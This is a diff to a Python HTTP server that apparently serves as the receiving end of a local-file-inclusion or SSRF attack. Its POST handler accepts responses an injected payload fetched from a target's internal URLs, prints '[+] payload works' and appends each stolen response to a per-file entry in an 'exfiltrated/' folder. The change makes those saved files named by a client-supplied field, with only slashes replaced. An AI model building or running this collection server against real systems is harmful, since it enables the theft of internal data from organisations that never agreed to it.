@@ -1,5 +1,6 @@
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import json
+import os
 
 class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
     def set_cors_headers(self):
@@ -37,7 +38,8 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
             # Handle other GET requests with a 404
             self.send_response(404)
             self.end_headers()
-            
+    
+      
             
     def do_POST(self):
         # Get the content length from headers
@@ -52,10 +54,20 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
             
             res : str = json_data["internal_api_res"]
             internal_lfi_path =  json_data["payload_url"]
+       
+                        
             
             if not ("Not Found".lower() in res.lower()):
                 print("[+] payload works => internal url: " + internal_lfi_path)
-                with open('exfiltrated/current_internal_response.txt', 'ab') as f:
+                
+                
+                file_name: str= json_data["file_name"]
+                                
+                valid_path = file_name.replace("/", "_")
+
+                save_path = 'exfiltrated/' + valid_path
+                
+                with open(save_path, 'ab') as f:
                     f.write(res.encode()) 
 
 
